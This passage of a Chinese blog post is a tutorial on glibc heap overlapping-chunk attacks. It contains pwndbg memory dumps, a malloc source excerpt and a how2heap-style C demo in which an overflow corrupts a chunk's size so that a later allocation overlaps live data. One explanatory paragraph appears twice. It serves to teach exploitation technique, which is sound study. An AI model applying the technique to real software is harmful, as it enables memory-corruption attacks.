class="number">0x3232323232323232</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过溢出修改p2的size位为0x180,这时将p3也包含进去了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x603100</span></span><br><span class="line"><span class="number">0x603100</span>:	<span class="number">0x3131313131313131</span>	<span class="number">0x0000000000000181</span></span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603130</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603140</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603150</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603160</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603170</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603180</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603190</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再去申请一块 0x180 大小的 p4，就能够编辑 p4 就可以修改 p3 的内容，编辑 p3 也可以修改 p4 的内容</p>
+<p>刚开始p4和p3的值为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">60</span>gx <span class="number">0x603100</span>       </span><br><span class="line"><span class="number">0x603100</span>:	<span class="number">0x3131313131313131</span>	<span class="number">0x0000000000000181</span>  <span class="comment">//p4</span></span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603130</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603140</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603150</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603160</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603170</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603180</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603190</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x6031a0</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x6031b0</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x6031c0</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x6031d0</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x6031e0</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x6031f0</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603200</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000080</span>  <span class="comment">//p3</span></span><br><span class="line"><span class="number">0x603210</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603220</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603230</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603240</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603250</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603260</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603270</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603280</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x0000000000020d81</span></span><br></pre></td></tr></table></figure>
+
+<p>如果memset(p4， ‘4’， 376)，则有:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x603100</span></span><br><span class="line"><span class="number">0x603100</span>:	<span class="number">0x3131313131313131</span>	<span class="number">0x0000000000000181</span>  <span class="comment">//p4</span></span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603130</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603140</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603150</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603160</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603170</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603180</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603190</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031a0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031b0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031c0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031d0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031e0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031f0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603200</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span>  <span class="comment">//p3</span></span><br><span class="line"><span class="number">0x603210</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603220</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603230</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603240</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603250</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603260</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603270</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603280</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x0000000000020d81</span></span><br></pre></td></tr></table></figure>
+
+<p>如果我们memset(p3， ‘3’， 80)，则有：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x603100</span></span><br><span class="line"><span class="number">0x603100</span>:	<span class="number">0x3131313131313131</span>	<span class="number">0x0000000000000181</span>  <span class="comment">//p4</span></span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603130</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603140</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603150</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603160</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603170</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603180</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603190</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031a0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031b0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031c0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031d0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031e0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x6031f0</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603200</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span>  <span class="comment">//p3</span></span><br><span class="line"><span class="number">0x603210</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603220</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603230</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603240</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603250</span>:	<span class="number">0x3333333333333333</span>	<span class="number">0x3333333333333333</span></span><br><span class="line"><span class="number">0x603260</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603270</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x3434343434343434</span></span><br><span class="line"><span class="number">0x603280</span>:	<span class="number">0x3434343434343434</span>	<span class="number">0x0000000000020d81</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，也可以制造部分重叠，前提是请求大小与size大小相同。 例如设置size为0xf0字节，然后调用malloc(0xe0)。这个例子的成 功，正是因为malloc对大小正好合适的堆块进行分配时检查比较弱。 </p>
+<p>那么，如果chunk的size并不刚好等于请求大小呢？例如设置 size为0x120字节，但只请求malloc(0xe0)的堆块，此时0x120字 节大小的chunk首先被整理回small bins，然后从中切分出0xf0字节 大小的空间返回，剩下的作为last_remainder。在这个过程中使用 了unlink函数，它包含一些对链表完整性的安全检查（参考11.5 节 ） ， 因 此 是 需 要 绕 过 的 。 其 中 对 本 例 影 响 较 大 的 检 查 是 chunk_size==next-&gt;prev-&gt;chunk_size（参考11.6节），因为 我们溢出后只修改了size，而没有与之相对应的prev_size，于是会 触发“corrupted size vs. prev_size”报错。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">size = chunksize (victim);</span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) ) ;</span><br><span class="line">remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">unlink (av , victim, bck , fwd);</span><br><span class="line">......</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p =chunk2mem (victim) ;</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
+
+<h3 id="扩展已分配块"><a href="#扩展已分配块" class="headerlink" title="扩展已分配块"></a>扩展已分配块</h3><p>扩展已分配块稍微复杂一点，因为我们不仅需要考虑堆块的分 配，还要考虑堆块的释放。一般来说，该技术在unsorted bin和 fastbins上均可使用，具体又可分为后向合并和前向合并。后向合并 是通过prev_size获得低地址的chunk并将其unlink；前向合并是通 过size获得高地址的chunk并将其unlink。因此控制了prev_size就 相当于控制了低地址的chunk；控制了size就相当于控制了next chunk，攻击过程中所需要绕过的检查主要就是unlink。扩展已分配块稍微复杂一点，因为我们不仅需要考虑堆块的分 配，还要考虑堆块的释放。一般来说，该技术在unsorted bin和 fastbins上均可使用，具体又可分为后向合并和前向合并。后向合并 是通过prev_size获得低地址的chunk并将其unlink；前向合并是通 过size获得高地址的chunk并将其unlink。因此控制了prev_size就 相当于控制了低地址的chunk；控制了size就相当于控制了next chunk，攻击过程中所需要绕过的检查主要就是unlink。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">这是一个简单的块重叠问题</span><br><span class="line">这也被称为非相邻自由块整合攻击</span><br><span class="line">让我们开始在堆上分配<span class="number">5</span>块:</span><br><span class="line">Chunk p1从<span class="number">0xff3010</span>到<span class="number">0xff33f8</span></span><br><span class="line">Chunk p2从<span class="number">0xff3400</span>到<span class="number">0xff37e8</span></span><br><span class="line">Chunk p3从<span class="number">0xff37f0</span>到<span class="number">0xff3bd8</span></span><br><span class="line">Chunk p4从<span class="number">0xff3be0</span>到<span class="number">0xff3fc8</span></span><br><span class="line">Chunk p5从<span class="number">0xff3fd0</span>到<span class="number">0xff43b8</span></span><br><span class="line">让我们释放p4块。</span><br><span class="line">在这种情况下，它没有与顶部块合并，因为在p4之后我们有p5与顶部块相邻</span><br><span class="line">让我们触发块p1上的漏洞，该漏洞将正在使用的块p2的大小改写为chunk_p2的大小+ chunk_p3的大小</span><br><span class="line">现在，在p2上的<span class="built_in">free</span>()操作期间，分配器误以为下一个块是p4(因为p2 + size_p2现在指向p4)</span><br><span class="line">这个操作基本上会创建一个大的空闲块，错误地包含了p3</span><br><span class="line">现在，让我们分配一个新的块，它的大小可以满足之前释放的块</span><br><span class="line">我们的<span class="built_in">malloc</span>()已经被我们设计的大的自由块所满足，现在p6和p3重叠了，我们可以通过写入p6块来覆盖p3中的数据</span><br><span class="line">Chunk p6从<span class="number">0xff3400</span>到<span class="number">0xff3bd8</span></span><br><span class="line">Chunk p3从<span class="number">0xff37f0</span>到<span class="number">0xff3bd8</span></span><br><span class="line">chunk p3内的数据:</span><br><span 